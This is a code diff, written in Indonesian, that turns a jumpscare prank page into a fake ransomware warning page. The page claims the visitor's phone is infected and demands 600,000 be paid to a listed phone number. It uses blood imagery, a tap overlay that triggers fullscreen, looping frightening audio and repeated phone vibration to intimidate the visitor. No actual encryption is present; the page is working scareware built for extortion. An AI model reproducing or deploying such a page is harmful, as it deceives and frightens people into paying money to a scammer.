@@ -2,64 +2,137 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Permainan Fokus</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Peringatan Ransomware</title>
   <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
     body {
-      margin: 0;
-      background: black;
-      color: white;
-      font-family: sans-serif;
-      text-align: center;
-      padding-top: 100px;
-    }
-    button {
-      padding: 15px 30px;
-      font-size: 18px;
-      background: red;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-    #jumpscare {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      z-index: 9999;
+      height: 100vh;
+      background: url('https://files.catbox.moe/h9hnru.jpeg') no-repeat center center/cover;
+      display: flex;
       justify-content: center;
       align-items: center;
-      background: black;
+      font-family: 'Impact', sans-serif;
+      overflow: hidden;
     }
-    video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
+
+    .overlay {
+      background: rgba(0, 0, 0, 0.75);
+      padding: 40px;
+      text-align: center;
+      border: 3px solid darkred;
+      border-radius: 10px;
+      position: relative;
+      width: 80%;
+      max-width: 600px;
+    }
+
+    h1, p {
+      color: #8b0000;
+      text-shadow: 2px 2px 10px black;
+      position: relative;
+      z-index: 2;
+    }
+
+    h1 { font-size: 2rem; margin-bottom: 20px; }
+    p { font-size: 1.3rem; }
+    span { font-weight: bold; color: #ff0000; }
+
+    /* Bercak darah */
+    .darah {
+      background: url('https://files.catbox.moe/juf5oo.png') no-repeat center; /* Ganti dengan PNG bercak darah */
+      background-size: contain;
+      position: absolute;
+      top: -60px;
+      left: -60px;
+      width: 200px;
+      height: 200px;
+      opacity: 0.8;
+      transform: rotate(-20deg);
+      z-index: 1;
+    }
+
+    /* Efek darah menetes */
+    .tetes {
+      position: absolute;
+      top: 0;
+      width: 10px;
+      height: 10px;
+      background: #8b0000;
+      border-radius: 50%;
+      animation: turun 3s infinite ease-in;
+    }
+
+    .tetes::after {
+      content: '';
+      position: absolute;
+      width: 8px;
+      height: 20px;
+      background: #8b0000;
+      border-radius: 5px;
+      top: -20px;
+      left: 1px;
+    }
+
+    @keyframes turun {
+      0% { top: 0; opacity: 1; }
+      70% { top: 100%; opacity: 1; }
+      100% { top: 110%; opacity: 0; }
+    }
+
+    /* Layer klik untuk start audio */
+    .klik-start {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: black;
+      color: red;
+      font-size: 1.5rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      z-index: 999;
     }
   </style>
 </head>
 <body>
+  <div class="overlay">
+    <div class="darah"></div>
+    <h1>⚠️ SELAMAT HP MU TERKENA RANSOMWARE ⚠️</h1>
+    <p>Bayar ke <span>081776900078</span> sebanyak 600.000 untuk dilepas!</p>
 
-  <h1>Fokus ke layar ya...</h1>
-  <p>Jangan berkedip dan klik tombol di bawah</p>
-  <button onclick="mulai()">Mulai</button>
-
-  <div id="jumpscare">
-    <video id="video" src="video.mp4" autoplay></video>
+    <!-- Tetesan darah -->
+    <div class="tetes" style="left: 10%; animation-delay: 0s;"></div>
+    <div class="tetes" style="left: 30%; animation-delay: 0.5s;"></div>
+    <div class="tetes" style="left: 50%; animation-delay: 1s;"></div>
+    <div class="tetes" style="left: 70%; animation-delay: 1.5s;"></div>
+    <div class="tetes" style="left: 90%; animation-delay: 2s;"></div>
   </div>
 
+  <div class="klik-start" id="start">TAP UNTUK MEMBUKA ⚠️</div>
+
+  <!-- Suara serem -->
+  <audio id="suara" loop>
+    <source src="https://files.catbox.moe/wkyhri.mp3" type="audio/mpeg">
+  </audio>
+
   <script>
-    function mulai() {
-      const video = document.getElementById("video");
-      video.volume = 1.0;
+    const startBtn = document.getElementById('start');
+    const suara = document.getElementById('suara');
 
-      setTimeout(() => {
-        document.getElementById("jumpscare").style.display = "flex";
-        video.currentTime = 0;
-        video.play().catch(err => console.error("Gagal play:", err));
-      }, 5000); // delay 5 detik
-    }
+    startBtn.addEventListener('click', async () => {
+      startBtn.style.display = 'none';
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen().catch(()=>{});
+      }
+      await suara.play();
+      // Efek getar HP
+      if (navigator.vibrate) {
+        setInterval(() => navigator.vibrate([100, 50, 100]), 3000);
+      }
+    });
   </script>
-
 </body>
 </html>
